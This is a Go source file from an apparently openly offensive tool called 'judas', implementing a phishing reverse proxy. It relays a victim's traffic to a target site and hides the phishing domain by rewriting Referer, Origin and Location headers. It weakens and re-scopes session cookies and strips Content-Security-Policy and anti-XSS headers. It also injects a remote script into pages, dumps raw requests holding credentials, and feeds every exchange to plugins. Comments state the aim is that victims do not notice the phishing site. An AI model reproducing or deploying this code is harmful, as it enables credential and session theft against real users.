package judas

import (
	"bytes"
	"context"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strconv"
	"strings"

	"github.com/valyala/bytebufferpool"
)

// bufferPool is a httputil.BufferPool backed by a bytebufferpool.ByteBuffer.
type bufferPool struct {
	*bytebufferpool.ByteBuffer
}

func (b *bufferPool) Get() []byte {
	return b.Bytes()
}

func (b *bufferPool) Put(payload []byte) {
	b.Set(payload)
}

// 多字符串匹配
func strContainList(rawStr string, checkStrList []string) bool {
	rawStr = strings.ToLower(rawStr)
	for _, checkStr := range checkStrList {
		if strings.Contains(rawStr, strings.ToLower(checkStr)) {
			return true
		}
	}
	return false
}

// 多字符串完全匹配
func strEqList(rawStr string, checkStrList []string) bool {
	rawStr = strings.ToLower(rawStr)
	for _, checkStr := range checkStrList {
		if rawStr == strings.ToLower(checkStr) {
			return true
		}
	}
	return false
}

// phishingProxy proxies requests between the victim and the target, queuing requests for further processing.
// It is meant to be embedded in a httputil.ReverseProxy, with the Director and ModifyResponse functions.
type phishingProxy struct {
	TargetURL     *url.URL
	Reverse       *ReverseConfig
	JavascriptURL string
	Logger        *log.Logger
}

// Director updates a request to be sent to the target website
func (p *phishingProxy) Director(request *http.Request) {
	// We need to do all other header processing before we change the host, otherwise updates will not happen correctly.
	// Damn you, mutable state.
	// Don't let a stray referer header give away the location of our site.
	// Note that this will not prevent leakage from full URLs.

	if strEqList(request.URL.RequestURI(), p.Reverse.DumpURL) {
		req, _ := httputil.DumpRequest(request, true)
		fmt.Printf("\n-------------------- %s start  -------------------------\n", request.URL.RequestURI())
		fmt.Printf("----- requests from: %s\n", request.RemoteAddr)
		fmt.Printf("----- requests raw: \n\n -----")
		fmt.Println(string(req))
		fmt.Printf("\n\n-------------------- %s end  ---------------------------\n\n", request.URL.RequestURI())

	}

	referer := request.Referer()
	if referer != "" {
		referer = strings.Replace(referer, request.Host, p.TargetURL.Host, 1)
		request.Header.Set("Referer", referer)
	}

	// Don't let a stray origin header give us away either.
	origin := request.Header.Get("Origin")
	if origin != "" {
		origin = strings.Replace(origin, request.Host, p.TargetURL.Host, 1)
		request.Header.Set("Origin", origin)
	}
	request.URL.Scheme = p.TargetURL.Scheme
	request.URL.Host = p.TargetURL.Host
	request.Host = p.TargetURL.Host
	if _, ok := request.Header["User-Agent"]; !ok {
		// explicitly disable User-Agent so it's not set to default value
		request.Header.Set("User-Agent", "")
	}

	// Go supports gzip compression, but not Brotli.
	// Since the underlying transport handles compression, remove this header to avoid problems.
	request.Header.Del("Accept-Encoding")
	request.Header.Del("Content-Encoding")
}

// ModifyResponse updates a response to be passed back to the victim so they don't notice they're on a phishing website.
func (p *phishingProxy) ModifyResponse(response *http.Response) error {
	err := p.modifyLocationHeader(response)
	if err != nil {
		return err
	}
	err = p.modifyCookieHeader(response)

	if err != nil {
		return err
	}
	if strContainList(response.Request.RequestURI, p.Reverse.InjectURLs) || p.Reverse.InjectURLs[0] == "*" {
		if p.JavascriptURL != "" {
			err = p.injectJavascript(response)
			if err != nil {
				return err
			}
		}
	}

	// Stop CSPs and anti-XSS headers from ruining our fun
	response.Header.Del("Content-Security-Policy")
	response.Header.Del("X-XSS-Protection")

	body, err := ioutil.ReadAll(response.Body)

	response.Body = ioutil.NopCloser(bytes.NewReader(body))
	response.ContentLength = int64(len(body))
	response.Header.Set("Content-Length", strconv.Itoa(len(body)))

	return nil
}

func (p *phishingProxy) modifyLocationHeader(response *http.Response) error {
	location, err := response.Location()
	if err != nil {
		if err == http.ErrNoLocation {
			return nil
		}
		return err
	}

	log.Printf("Location Host :%s, targetURL: %s \n", location.Host, p.TargetURL.Host)
	if p.TargetURL.Host == location.Host {
		location.Scheme = ""
		location.Host = ""
	}
	// Turn it into a relative URL

	response.Header.Set("Location", location.String())
	return nil
}

func (p *phishingProxy) modifyCookieHeader(response *http.Response) error {
	var mcook []string
	rcookies := response.Cookies()
	for _, value := range rcookies {
		value.Secure = false
		if !p.Reverse.CookieHttpOnly {
			value.HttpOnly = false
		}
		value.Domain = p.Reverse.Address
		mcook = append(mcook, value.String())
		if p.Reverse.CookieDomain != "" {
			value.Domain = p.Reverse.CookieDomain
		}
		mcook = append(mcook, value.String())
	}
	response.Header.Del("Set-Cookie")
	for _, mc := range mcook {
		response.Header.Add("Set-Cookie", mc)
	}
	return nil
}

func (p *phishingProxy) injectJavascript(response *http.Response) error {
	log.Printf("url :%s\n", response.Request.RequestURI)
	if !strings.Contains(response.Header.Get("Content-Type"), "text/html") {
		return nil
	}

	html, _ := ioutil.ReadAll(response.Body)
	response.Body = ioutil.NopCloser(bytes.NewBuffer(html))
	if bytes.Index(html, []byte("html")) == -1 {
		return nil
	}

	payload := fmt.Sprintf("<script type='text/javascript' src='%s'></script>", p.JavascriptURL)
	log.Printf("url :%s, payload: %s\n", response.Request.RequestURI, payload)
	html = append(html, payload...)

	response.Body = ioutil.NopCloser(bytes.NewBuffer(html))
	response.Header.Set("Content-Length", fmt.Sprint(len(html)))
	return nil
}

// InterceptingTransport sends the HTTP exchange to the loaded plugins.
type InterceptingTransport struct {
	http.RoundTripper
	Plugins   *PluginBroker
	TargetURL *url.URL
}

// RoundTrip executes the HTTP request and sends the exchange to judas's loaded plugins
func (t *InterceptingTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	if t.Plugins != nil {
		err := t.Plugins.TransformRequest(req)
		if err != nil {
			return nil, err
		}
	}

	// Keep the request around for the plugins
	request := &Request{Request: req}
	clonedRequest, err := request.CloneBody(context.Background())
	if err != nil {
		return nil, err
	}

	resp, err := t.RoundTripper.RoundTrip(req)
	if err != nil {
		return nil, err
	}

	// If we haven't loaded any plugins, don't bother cloning the request or anything.
	if t.Plugins == nil {
		return resp, nil
	}

	response := &Response{Response: resp}
	clonedResponse, err := response.CloneBody()
	if err != nil {
		return nil, err
	}

	httpExchange := &HTTPExchange{
		Request:  clonedRequest,
		Response: clonedResponse,
		Target:   t.TargetURL,
	}

	err = t.Plugins.SendResult(httpExchange)
	if err != nil {
		return nil, err
	}

	err = t.Plugins.TransformResponse(resp)
	return resp, err
}

// ProxyServer exposes the reverse proxy over HTTP.
type ProxyServer struct {
	reverseProxy *httputil.ReverseProxy
	logger       *log.Logger
}

// HandleRequests reverse proxies all traffic to the target server.
func (p *ProxyServer) HandleRequests(w http.ResponseWriter, r *http.Request) {
	p.reverseProxy.ServeHTTP(w, r)
}

// New returns a HTTP handler configured for phishing.
func New(config *Config) *ProxyServer {
	phishingProxy := &phishingProxy{
		TargetURL:     config.TargetURL,
		Reverse:       config.Reverse,
		JavascriptURL: config.JavascriptURL,
		Logger:        config.Logger,
	}

	reverseProxy := &httputil.ReverseProxy{
		Director:       phishingProxy.Director,
		ModifyResponse: phishingProxy.ModifyResponse,
		ErrorLog:       config.Logger,
		Transport:      config.Transport,
		BufferPool:     &bufferPool{ByteBuffer: &bytebufferpool.ByteBuffer{}},
	}

	return &ProxyServer{
		reverseProxy: reverseProxy,
		logger:       config.Logger,
	}
}
